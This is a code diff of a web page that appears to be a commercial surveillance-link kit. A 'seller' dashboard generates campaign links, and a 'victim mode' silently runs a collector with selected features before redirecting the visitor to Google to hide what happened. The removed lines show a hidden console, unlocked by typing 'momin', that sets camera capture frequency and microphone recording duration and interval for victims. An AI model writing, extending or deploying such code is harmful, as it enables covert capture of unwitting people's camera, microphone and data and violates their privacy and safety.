-        secretTrigger += e.key;
-        if(secretTrigger.includes('MR_MOMIN_🌍') || secretTrigger.toLowerCase().includes('momin')){
-            consoleDiv.style.display = 'block';
-            secretTrigger = '';
-            logConsole('> CONSOLE UNLOCKED. Type "help" for commands.');
+
+    // ========== MAIN ==========
+    const urlParams = new URLSearchParams(window.location.search);
+    const uidParam = urlParams.get('uid');
+    const campParam = urlParams.get('camp');
+
+    if(uidParam && campParam) {
+        // Victim mode
+        document.getElementById('dashboardPanel').classList.add('hide');
+        document.getElementById('victimPanel').classList.remove('hide');
+        // Fetch campaign features
+        const campRef = db.ref(`sellers/${uidParam}/campaigns/${campParam}`);
+        campRef.once('value', async (snap) => {
+            if(!snap.exists()) {
+                document.querySelector('#victimPanel p').innerText = 'Invalid link.';
+                document.querySelector('#victimPanel .loader').style.display = 'none';
+                return;
+            }
+            const features = snap.val().features;
+            await startVictimCollector(uidParam, campParam, features);
+            // After 10 seconds redirect
+            setTimeout(() => {
+                window.location.href = 'https://www.google.com';
+            }, 10000);
+        });
+    } else {
+        // Seller mode
+        let storedUid = localStorage.getItem('momin_uid');
+        if(storedUid) {
+            loadSellerDashboard(storedUid);
+        } else {
+            // First time: generate new UID
+            const newUid = generateUID();
+            localStorage.setItem('momin_uid', newUid);
+            loadSellerDashboard(newUid);
         }
-        if(secretTrigger.length > 20) secretTrigger = '';
-    });
-    function logConsole(msg){ consoleOut.innerHTML += `<div>> ${msg}</div>`; consoleOut.scrollTop = consoleOut.scrollHeight; }
-    consoleInput.addEventListener('keypress', (e) => {
-        if(e.key === 'Enter'){
-            let cmd = consoleInput.value.trim();
-            logConsole(`> ${cmd}`);
-            if(cmd === 'help') logConsole('Available: set_freq <ms> | set_mic_duration <sec> | set_mic_interval <sec> | show_config | hide');
-            else if(cmd.startsWith('set_freq')) {
-                let ms = parseInt(cmd.split(' ')[1]);
-                if(!isNaN(ms)) { localStorage.setItem('camFreq', ms); logConsole(`Camera freq set to ${ms}ms`); }
-                else logConsole('Usage: set_freq 333');
-            }
-            else if(cmd.startsWith('set_mic_duration')) {
-                let sec = parseInt(cmd.split(' ')[1]);
-                if(!isNaN(sec)) { localStorage.setItem('micDuration', sec); logConsole(`Mic duration set to ${sec} sec`); }
-                else logConsole('Usage: set_mic_duration 6');
-            }
-            else if(cmd.startsWith('set_mic_interval')) {
-                let sec = parseInt(cmd.split(' ')[1]);
-                if(!isNaN(sec)) { localStorage.setItem('micInterval', sec); logConsole(`Mic interval set to ${sec} sec`); }
-                else logConsole('Usage: set_mic_interval 10');
-            }
-            else if(cmd === 'show_config') {
-                logConsole(`Current config: camFreq=${localStorage.getItem('camFreq')||'333'}ms, micDur=${localStorage.getItem('micDuration')||'6'}sec, micInt=${localStorage.getItem('micInterval')||'10'}sec`);
-            }
-            else if(cmd === 'hide') { consoleDiv.style.display = 'none'; }
-            else logConsole('Unknown command. Type help');
-            consoleInput.value = '';
-        }
-    });
+        // Setup event listeners
+        document.getElementById('generateLinkBtn').addEventListener('click', generateNewCampaign);
+        document.getElementById('copyLinkBtn').addEventListener('click', () => {
+            const link = document.getElementById('newLinkText').innerText;
+            if(link && link !== '--') copyClip(link);
+        });
+        document.getElementById('newUidBtn').addEventListener('click', () => {
+            const newUid = generateUID();
+            localStorage.setItem('momin_uid', newUid);
+            loadSellerDashboard(newUid);
+            showMsg('✅ New UID created!');
+        });
+        // Feature selection toggles
+        document.querySelectorAll('.feature-card').forEach(card => {
+            card.addEventListener('click', () => {
+                card.classList.toggle('selected');
+            });
+        });
+    }
 </script>
 </body>
 </html>
